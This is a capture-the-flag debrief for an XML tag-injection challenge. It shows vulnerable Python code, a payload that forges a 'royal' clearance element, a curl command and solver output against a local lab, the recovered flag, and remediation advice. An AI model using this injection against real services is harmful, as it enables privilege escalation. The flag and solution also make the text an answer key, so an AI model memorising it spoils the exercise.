# Palace Blueprint Tampering, Debrief

**Node:** `p5_2` &middot; **Flag:** `SEIYAKU{inject_a_new_tag}` &middot; **Route:** `POST /p5/blueprint` &middot; **Sink:** `challenges/phase5.py`, real `lxml` parser via `core/xml_parser.parse()`, flag stored in real MariaDB (`palace_clearances`) &middot; **Signal:** the printed badge's `clearance` field, cross-referenced against the real seeded lookup table

## XML basics, briefly

- An XML document is a tree of elements: `<tag>content</tag>`, nested
  inside each other, with exactly one root element.
- Five characters are **reserved** the moment they appear in text
  content or an attribute value, because they're how the grammar itself
  is written: `< > & ' "`. A literal occurrence of any of them inside
  what's meant to be plain text has to be escaped
  (`&lt; &gt; &amp; &apos; &quot;`) or the parser reads it as the start
  of new markup instead of literal text.
- A **well-formed** document is one where every tag that opens also
  closes, tags nest properly, and there's exactly one root, a
  well-formedness rule the parser genuinely enforces regardless of this
  bug. A document can be perfectly well-formed and still not be the
  *shape* its author intended.

## The bug, in one line

`challenges/phase5.py`'s `p5_blueprint()` builds its XML document with a
plain Python `.format()` call, splicing the visitor-supplied `name`
directly into the template with none of the five reserved characters
escaped first:

```python
# challenges/phase5.py, p5_2
_GUEST_BADGE_TEMPLATE = (
    "<badge><visitor>{name}</visitor><clearance>guest</clearance></badge>"
)
...
raw_xml = _GUEST_BADGE_TEMPLATE.format(name=name)
doc = xml_parser.parse(raw_xml.encode("utf-8"))
```

For an ordinary name, `Gon`, `Killua`, anything with no `<` or `&` in
it, this produces exactly the intended two-element badge:

```xml
<badge><visitor>Gon</visitor><clearance>guest</clearance></badge>
```

But `name` was never validated to be free of XML's own reserved
characters before it was treated as content safe to insert into an XML
document. A name containing its own `<`/`>` doesn't become literal text
describing a visitor's name once parsed, it becomes new markup, read
by the parser as real document structure, exactly as if it had been
part of the original template.

## Why a stray `<` gets rejected, and why that's not the fix

A single unbalanced `<` (`name=<`) breaks well-formedness outright:

```xml
<badge><visitor><</visitor><clearance>guest</clearance></badge>
```

`lxml` correctly refuses to parse this, `StartTag: invalid element
name`, because `<` on its own can't start a valid tag. This proves the
parser is genuinely running and genuinely enforcing XML's grammar; it
is not simply ignoring malformed input. The bug is not "this parser
accepts anything." It's that a **well-formed** document with **extra
structure** the template's author never anticipated is, correctly,
accepted, because from the parser's perspective, that's a perfectly
valid XML document. The mistake is entirely upstream, at the point
where untrusted text was trusted to become content without ever being
escaped.

## The payload

```
name = </visitor><clearance>royal</clearance><visitor>x
```

Substituted into the template character-for-character:

```
<badge><visitor>            <- template
</visitor><clearance>royal</clearance><visitor>x   <- name, verbatim
</visitor><clearance>guest</clearance></badge>      <- template
```

concatenates to the actual document the press hands to the parser:

```xml
<badge><visitor></visitor><clearance>royal</clearance><visitor>x</visitor><clearance>guest</clearance></badge>
```

This is completely well-formed: every tag opens and closes, nesting is
clean, one root (`<badge>`). It's just no longer a two-element document
, it now has **two** `<visitor>` elements and **two** `<clearance>`
elements, sitting as siblings under `<badge>`.

`challenges/phase5.py` reads the parsed document with:

```python
clearance_el = doc.find(".//clearance")
```

`lxml`'s `.find()` (like most XML APIs' single-match lookups) returns
the **first matching element in document order**, not "the last one
written" or "the one the template's author meant." Since the injected
`<clearance>royal</clearance>` appears in the string *before* the
template's own `<clearance>guest</clearance>`, `.find()` returns the
injected one. The badge that gets printed carries `clearance: "royal"`
, a value the template's code never writes on its own, on any input.

Live proof against the real running stack:

```bash
curl -s -X POST "$BASE/p5/blueprint" -H "Accept: application/json" \
    --data-urlencode 'name=</visitor><clearance>royal</clearance><visitor>x'
```

```json
{"badge":{"clearance":"royal","clearance_description":"The King's own clearance, the badge press was never wired to write this level to any badge.","visitor":null},"error":null,"flag":"SEIYAKU{inject_a_new_tag}","raw_xml":"<badge><visitor></visitor><clearance>royal</clearance><visitor>x</visitor><clearance>guest</clearance></badge>","success":true,"visitor":"</visitor><clearance>royal</clearance><visitor>x"}
```

## Where the flag actually comes from

Once the parsed `clearance` value is `"royal"`, the route runs one more,
genuinely-safe, parameterized query against the real, seeded
`palace_clearances` table:

```python
# challenges/phase5.py, _lookup_clearance()
cur.execute(
    "SELECT level, description, flag FROM palace_clearances WHERE level = %s",
    (level,),
)
```

Only that table's `royal` row has a non-empty `flag` column, `guest`
and `staff` both have an empty string. This lookup itself is not the
vulnerability (it's a properly parameterized query); it's simply how
the flag, once you've earned the right clearance value, gets attached
to the badge you're shown. The injection is entirely upstream, in how
`clearance` was ever allowed to become `"royal"` in the first place.

## The full solver, live

`solvers/p5_2.sh` runs all three checks below against the real running
stack, in order: (1) a plain name prints an ordinary clean guest badge,
(2) a stray unbalanced `<` is rejected as malformed XML, (3) the
tag-injection payload. This is the actual, unedited output of a real
run against this exact seed (`SEIYAKU_BASE` was the default
`http://localhost:8000` for this run):

```
[p5_2] target: http://localhost:8000/p5/blueprint
[p5_2] step 1, plain visitor name: name=Gon
  response: {"badge":{"clearance":"guest","clearance_description":"Standard visitor pass, issued by the badge press to anyone.","visitor":"Gon"},"error":null,"flag":null,"raw_xml":"<badge><visitor>Gon</visitor><clearance>guest</clearance></badge>","success":false,"visitor":"Gon"}
  ok: plain name printed an ordinary guest badge
[p5_2] step 2, malformed XML metachar: name=<
  response: {"badge":null,"error":"the blueprint press rejected that badge: StartTag: invalid element name, line 1, column 18 (<string>, line 1)","flag":null,"raw_xml":"<badge><visitor><</visitor><clearance>guest</clearance></badge>","success":false,"visitor":"<"}
  ok: a stray '<' was rejected as malformed XML (parser genuinely runs)
[p5_2] step 3, tag injection: name=</visitor><clearance>royal</clearance><visitor>x
  response: {"badge":{"clearance":"royal","clearance_description":"The King's own clearance, the badge press was never wired to write this level to any badge.","visitor":null},"error":null,"flag":"SEIYAKU{inject_a_new_tag}","raw_xml":"<badge><visitor></visitor><clearance>royal</clearance><visitor>x</visitor><clearance>guest</clearance></badge>","success":true,"visitor":"</visitor><clearance>royal</clearance><visitor>x"}
  ok: injected <clearance>royal</clearance> won the badge, flag recovered: SEIYAKU{inject_a_new_tag}
[p5_2] ok: plain badge clean, malformed XML rejected, tag injection
[p5_2]     recovered the flag from real seeded palace_clearances
[p5_2] PASS
```

## Related XML attack surface, briefly (not exploited on this floor)

- **XPath Injection**, the same "attacker text becomes structure"
  idea, but against an XPath query string instead of the document
  itself, e.g. `//user[name='{input}']`.
- **XInclude**, a separate mechanism (`xi:include`) that pulls in
  *other* XML content by reference at parse time; dangerous for reasons
  that rhyme with the next floor's XXE.
- **Billion Laughs**, a DoS built from deeply nested entity
  expansion (`<!ENTITY a "1000 lols">` referencing itself
  recursively), a resource-exhaustion attack, not a data-disclosure one.
- **XXE** (external entities), the next floor, and the reason
  `core/xml_parser.py` is already configured with `resolve_entities=True`
  even though this floor's bug never needed that setting at all.

## HxH analogy

Conjuration materializes something real from a set of rules the
Conjurer defines, the object behaves exactly as specified, faithfully,
every time. The badge press is exactly that: a rule-following printer
that turns a blueprint into a real, working badge every checkpoint
trusts completely. Nothing about the press malfunctioned when it
printed a royal badge, it read a well-formed blueprint and printed
precisely what that blueprint said, exactly the way it always does.
What broke is that the *blueprint itself* was never protected from
having new lines added to it by whoever supplied the one piece of
content it was built to hold. The press did its job perfectly. The
blueprint handed to it simply wasn't the blueprint anyone thought they
were building.

## Remediation

- **Escape XML's five reserved characters in every value inserted into
  a hand-built document, always.** `xml.sax.saxutils.escape()` (or
  `lxml`'s own element-construction API, below) does this correctly:

  ```python
  from xml.sax.saxutils import escape

  raw_xml = _GUEST_BADGE_TEMPLATE.format(name=escape(name))
  ```

- **Better: never hand-build XML with string formatting at all.**
  Construct the document with the parser's own element API, which
  makes injection structurally impossible, there is no string for
  attacker content to "break out of," because content is only ever set
  as a node's `.text`, never spliced into markup:

  ```python
  from lxml import etree

  badge = etree.Element("badge")
  etree.SubElement(badge, "visitor").text = name
  etree.SubElement(badge, "clearance").text = "guest"
  raw_xml = etree.tostring(badge)
  ```

- **Don't trust the first match when a document might contain more
  elements than expected.** Even with escaping fixed, code that reads
  "the first `<clearance>` anywhere in the tree" is fragile the moment
  any upstream source might legitimately produce more than one. Prefer
  strict schema validation (XSD/RelaxNG) that rejects a document with
  an unexpected element count or shape outright, rather than silently
  picking one candidate among several.
- **Validate structure, not just content.** A schema-validating parser
  would have rejected this floor's injected document immediately, not
  because any single character was disallowed, but because `<badge>`
  containing two `<clearance>` children doesn't match the expected
  shape, regardless of how well-formed the XML itself is.
